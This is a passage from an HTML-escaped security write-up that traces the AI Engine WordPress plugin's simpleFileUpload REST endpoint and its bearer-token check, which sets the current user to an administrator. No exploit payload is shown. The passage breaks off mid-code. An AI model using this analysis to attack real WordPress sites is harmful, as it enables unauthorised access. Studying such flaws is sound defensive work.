class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;bearer_token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;add_filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;mwai_allow_public_api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;auth_via_bearer_token&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;register_rest_route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;mwai/v1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/simpleFileUpload&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;methods&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;rest_simpleFileUpload&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;permission_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;can_access_public_api&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;simpleFileUpload&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function checks whether the &lt;strong&gt;Public API&lt;/strong&gt; option is enabled. According to the plugin &lt;a href=&#34;https://ai.thehiddendocs.com/public-rest-api/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;documentation&lt;/a&gt;, this option is disabled by default:&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;By default, the Public REST API is disabled completely. If you enable it, only authentified API requests will actually go through, otherwise they will be rejected. You can override this behavior in many ways and we will see a few examples. The Public REST API is also limited by the Limits set in AI Engine (either as Users or Guests, and System).&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;You can enable it in the Admin Dashboard at &lt;code&gt;wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png&#34; title=&#34;enable the REST API&#34; data-thumbnail=&#34;https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png&#34; data-sub-html=&#34;&lt;h2&gt;enable the REST API&lt;/h2&gt;&lt;p&gt;enable the REST API&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://ai.thehiddendocs.com/wp-content/uploads/sites/2/2025/07/image-8.png&#39; alt=&#34;enable the REST API&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;enable the REST API&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;According to the description, when this option is enabled, only &lt;code&gt;authenticated&amp;ensp;API&amp;ensp;requests&lt;/code&gt; are accepted. There are two authentication methods:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;X-WP-Nonce&lt;/code&gt;: Obtained via the JavaScript object &lt;code&gt;wpApiSettings&lt;/code&gt; for logged-in users (Subscriber+)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;Bearer&amp;ensp;Token&lt;/code&gt;: Configured by the admin&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;bearer_token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_option&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;public_api_bearer_token&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;bearer_token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;add_filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;mwai_allow_public_api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;auth_via_bearer_token&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When a Bearer Token is set, the plugin &lt;strong&gt;registers a filter&lt;/strong&gt; named &lt;code&gt;mwai_allow_public_api&lt;/code&gt;,&#xA;with the &lt;strong&gt;callback&lt;/strong&gt; being the method &lt;code&gt;auth_via_bearer_token&lt;/code&gt;.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;register_rest_route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;mwai/v1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/simpleFileUpload&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;methods&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;rest_simpleFileUpload&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;permission_callback&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;can_access_public_api&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;simpleFileUpload&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;An API is registered with method POST:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Endpoint: &lt;code&gt;/wp-json/mwai/v1/simpleFileUpload&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Callback: &lt;code&gt;rest_simpleFileUpload&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;With &lt;code&gt;permission_callback&lt;/code&gt; being the return value of &lt;code&gt;can_access_public_api()&lt;/code&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;can_access_public_api&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$feature&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$extra&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$logged_in&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_user_logged_in&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;mwai_allow_public_api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$logged_in&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$feature&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$extra&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the WP REST API, the function &lt;code&gt;is_user_logged_in()&lt;/code&gt; will return:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;true&lt;/code&gt;: If the user is logged in and the &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; header is valid&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;false&lt;/code&gt;: If the user is not logged in or the &lt;strong&gt;X-WP-Nonce&lt;/strong&gt; header is invalid&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;code&gt;can_access_public_api&lt;/code&gt; will call the &lt;code&gt;mwai_allow_public_api&lt;/code&gt; filter registered above =&amp;gt; &lt;code&gt;auth_via_bearer_token($logged_in,&amp;ensp;$feature,&amp;ensp;$extra)&lt;/code&gt; is invoked&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;auth_via_bearer_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$feature&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$extra&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$extra&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$extra&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Authorization&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$extra&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Authorization&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Bearer&amp;ensp;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;bearer_token&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;We&amp;ensp;set&amp;ensp;the&amp;ensp;current&amp;ensp;user&amp;ensp;to&amp;ensp;the&amp;ensp;first&amp;ensp;admin.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$admin&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_admin_user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_set_current_user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$admin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$admin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;user_login&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 